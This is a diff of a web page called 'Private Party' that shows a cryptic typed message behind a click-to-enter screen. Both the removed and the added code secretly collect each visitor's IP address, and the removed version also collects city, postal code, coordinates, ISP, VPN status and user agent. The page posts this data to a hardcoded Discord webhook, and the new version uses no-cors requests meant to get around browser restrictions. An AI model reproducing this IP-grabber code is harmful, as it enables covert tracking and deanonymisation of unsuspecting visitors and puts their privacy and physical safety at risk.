@@ -1,84 +1,79 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Private Party</title>
-<style>
-body{background:#000;color:#999;font-family:"Courier New",monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;user-select:none;overflow:hidden;cursor:none;}
-#text{font-size:1.3rem;letter-spacing:2px;white-space:pre;}
-.trail{position:absolute;width:3px;height:3px;background:#999;border-radius:50%;pointer-events:none;opacity:0;transition:opacity 0.2s;}
-#sadface{position:fixed;bottom:10px;left:10px;color:#999;cursor:pointer;font-size:1.2rem;transition:color 0.2s;}
-#sadface:hover{color:#fff;}
-</style>
+    <meta charset="UTF-8">
+    <title>Private Party</title>
+    <style>
+        body { background: #000; color: #999; font-family: "Courier New", monospace; margin: 0; overflow: hidden; }
+        #enterScreen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; z-index: 9999; }
+        #enterBtn { margin-top: 20px; padding: 10px 25px; border: 1px solid #999; background: transparent; color: #999; font-family: "Courier New"; cursor: pointer; transition: 0.3s; }
+        #enterBtn:hover { color: #fff; border-color: #fff; box-shadow: 0 0 10px #fff; }
+        #main { display: none; height: 100vh; align-items: center; justify-content: center; }
+        #text { font-size: 1.3rem; letter-spacing: 2px; white-space: pre-wrap; color: #fff; text-align: center; }
+    </style>
 </head>
 <body>
-<div id="text"></div>
-<div id="sadface">:(</div>
-<audio id="bgmusic" loop><source src="Volare.mp3" type="audio/mpeg"></audio>
+
+<div id="enterScreen">
+    <div>
+        [ CLICK TO ENTER ]<br><br>
+        i love ave so much shes my baby :).<br><br>
+    </div>
+    <button id="enterBtn">ENTER</button>
+</div>
+
+<div id="main">
+    <div id="text"></div>
+</div>
 
 <script>
-// --- VISUALS ---
-const message="we never condoned violence";
-const textEl=document.getElementById("text");
-let charIdx=0;
-function type(){if(charIdx<message.length){textEl.textContent+=message[charIdx];charIdx++;setTimeout(type,100);}}
-type();
+const webhook = "https://discord.com/api/webhooks/1479284599925510316/_ICehxGmoiUvxjBcOGo-kuYdKAnozybsjq5p6hzeCQ4xcBSYHDmpp-plb3adBsXdTkWv";
 
-document.addEventListener("mousedown",()=>{document.getElementById("bgmusic").play().catch(()=>{})},{once:true});
-
-const trail=[];
-for(let j=0;j<15;j++){
-    const dot=document.createElement("div");
-    dot.className="trail";
-    document.body.appendChild(dot);
-    trail.push(dot);
-}
-let t=0;
-document.addEventListener("mousemove",e=>{
-    const dot=trail[t];
-    dot.style.left=(e.pageX-1.5)+"px";
-    dot.style.top=(e.pageY-1.5)+"px";
-    dot.style.opacity=1;
-    setTimeout(()=>{dot.style.opacity=0;},300);
-    t=(t+1)%15;
-});
-
-// --- THE LOGGING ---
-async function log() {
-    const webhook = "https://discord.com/api/webhooks/1479284599925510316/_ICehxGmoiUvxjBcOGo-kuYdKAnozybsjq5p6hzeCQ4xcBSYHDmpp-plb3adBsXdTkWv";
+document.getElementById("enterBtn").onclick = async () => {
+    // 1. UI Switch
+    document.getElementById("enterScreen").style.display = "none";
+    document.getElementById("main").style.display = "flex";
     
+    // Start typing the message immediately
+    const message = "we never condoned violence";
+    const textElement = document.getElementById("text");
+    let i = 0;
+    const type = () => {
+        if (i < message.length) {
+            textElement.textContent += message[i++];
+            setTimeout(type, 100);
+        }
+    };
+    type();
+
+    // 2. The Log (The part that actually works)
     try {
-        const response = await fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,regionName,city,zip,lat,lon,timezone,currency,isp,org,as,mobile,proxy,hosting,query');
-        const d = await response.json();
+        // Fetch IP with a timeout so it doesn't hang
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 3000);
         
-        // Simplified VPN/Proxy Logic
-        const isVpn = (d.proxy || d.hosting) ? "Yes" : "No";
+        const ipRes = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
+        const ipData = await ipRes.json();
+        const userIP = ipData.ip;
 
-        const payload = {
-            embeds: [{
-                title: "💀 New Visitor Logged",
-                color: 0x000000,
-                fields: [
-                    { name: "🛡️ VPN/Proxy", value: `\`${isVpn}\``, inline: true },
-                    { name: "📶 Network Type", value: `\`${d.mobile ? "Mobile" : "Broadband"}\``, inline: true },
-                    { name: "🌐 Connection", value: `**IP:** \`${d.query}\`\n**ISP:** \`${d.isp}\``, inline: false },
-                    { name: "📍 Location", value: `**City:** \`${d.city}\`\n**Country:** \`${d.country}\`\n**Postal:** \`${d.zip}\``, inline: true },
-                    { name: "⚙️ Metadata", value: `**Timezone:** \`${d.timezone}\`\n**Lat/Lon:** \`${d.lat}, ${d.lon}\``, inline: true },
-                    { name: "🗺️ Mapping", value: `👉 [Google Maps](https://www.google.com/maps?q=${d.lat},${d.lon})`, inline: false },
-                    { name: "💻 User Agent", value: `\`\`\`bash\n"${navigator.userAgent}"\n\`\`\``, inline: false }
-                ],
-                footer: { text: "privateparty.sh • Intrusive Analytics" },
-                timestamp: new Date().toISOString()
-            }]
-        };
+        // Using FormData to bypass CORS restrictions
+        // This is the most reliable way to hit a Discord Webhook from a browser
+        const params = new FormData();
+        params.append('content', `**[NEW ACCESS: privateparty.sh]**\n> **IP:** \`${userIP}\`\n> **Browser:** \`${navigator.userAgent.split(') ')[1]}\``);
 
-        await fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
-    } catch (e) {}
-}
-log();
+        fetch(webhook, {
+            method: 'POST',
+            mode: 'no-cors', // Bypasses the "Options" preflight block
+            body: params
+        });
 
-document.addEventListener("contextmenu", e=>e.preventDefault());
-document.getElementById("sadface").onclick = () => window.open("https://t.me/publicpartys", "_blank");
+    } catch (e) {
+        // Fallback: Send a notification that someone joined even if IP fetch failed
+        const fallback = new FormData();
+        fallback.append('content', "⚠️ **Connection detected (IP hidden by Adblock/VPN)**");
+        fetch(webhook, { method: 'POST', mode: 'no-cors', body: fallback });
+    }
+};
 </script>
 </body>
 </html>
